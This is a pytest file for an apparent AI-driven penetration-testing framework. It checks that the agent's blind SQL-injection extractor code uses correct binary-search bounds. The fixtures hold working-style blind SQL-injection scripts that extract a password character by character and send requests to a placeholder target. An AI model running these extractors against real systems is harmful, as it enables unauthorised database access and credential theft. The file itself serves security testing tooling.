from __future__ import annotations

from ravage.agent_core.frontier_extractor_correctness import (
    detect_extractor_correctness_issue,
    extractor_correctness_constraints,
    extractor_correctness_message,
)
from ravage.agent_core.frontier_route import FrontierObjective


def _objective(*, family: str = "sql_injection") -> FrontierObjective:
    return FrontierObjective.create(
        family=family,
        probe="sqli_exploit",
        endpoint="/index.php",
        inputs=("username",),
        payload_class="confirmed_primitive:sqli_confirmed:proof_channel",
        expected_signal="extract a replayable target value",
    )


def _extractor(*, adjustment: str) -> dict[str, object]:
    return {
        "action": "run_python",
        "code": (
            "import urllib.request\n"
            "def char_at(pos):\n"
            "    lo,hi=31,126\n"
            "    while lo<hi:\n"
            "        mid=(lo+hi+1)//2\n"
            "        if oracle(f'ascii(substring((select password),{pos},1))>{mid}'):\n"
            "            lo=mid\n"
            "        else:\n"
            "            hi=mid-1\n"
            f"    return chr(lo{adjustment})\n"
            "for pos in range(1,33):\n"
            "    prefix += char_at(pos)\n"
            "    urllib.request.urlopen('http://target/index.php?username='+prefix)\n"
            "    print('PREFIX[%d]=%s' % (pos,prefix))\n"
        ),
    }


def test_strict_greater_search_rejects_unadjusted_lower_boundary() -> None:
    objective = _objective()
    issue = detect_extractor_correctness_issue(
        objective,
        _extractor(adjustment=""),
    )

    assert issue is not None
    assert issue.code == "strict_greater_off_by_one"
    assert issue.functions == ("char_at",)
    assert "lower + 1" in extractor_correctness_message(objective, issue)


def test_strict_greater_search_accepts_adjusted_and_bracketed_boundary() -> None:
    objective = _objective()

    assert (
        detect_extractor_correctness_issue(
            objective,
            _extractor(adjustment="+1"),
        )
        is None
    )
    constraints = " ".join(extractor_correctness_constraints(objective))
    assert "lower + 1" in constraints
    assert "bracket-check" in constraints


def test_run15_style_saved_oracle_result_and_direct_append_are_rejected() -> None:
    action = {
        "action": "run_python",
        "code": (
            "import urllib.request\n"
            "def get_len(expr):\n"
            "    lo,hi=0,64\n"
            "    while lo<hi:\n"
            "        mid=(lo+hi+1)//2\n"
            "        ok,_=oracle(f'length(({expr}))>{mid}')\n"
            "        if ok: lo=mid\n"
            "        else: hi=mid-1\n"
            "    return lo\n"
            "def get_str(expr):\n"
            "    out=''\n"
            "    for pos in range(1,33):\n"
            "        lo,hi=31,126\n"
            "        while lo<hi:\n"
            "            mid=(lo+hi+1)//2\n"
            "            ok,_=oracle(f'ascii(substring(({expr}),{pos},1))>{mid}')\n"
            "            if ok: lo=mid\n"
            "            else: hi=mid-1\n"
            "        out += chr(lo)\n"
            "        urllib.request.urlopen('http://target/index.php?username='+out)\n"
            "        print(f'PREFIX[{pos}]={out}')\n"
            "    return out\n"
        ),
    }

    issue = detect_extractor_correctness_issue(_objective(), action)

    assert issue is not None
    assert set(issue.functions) == {"get_len", "get_str"}


def test_extractor_gate_does_not_apply_to_other_families() -> None:
    assert (
        detect_extractor_correctness_issue(
            _objective(family="template_injection"),
            _extractor(adjustment=""),
        )
        is None
    )
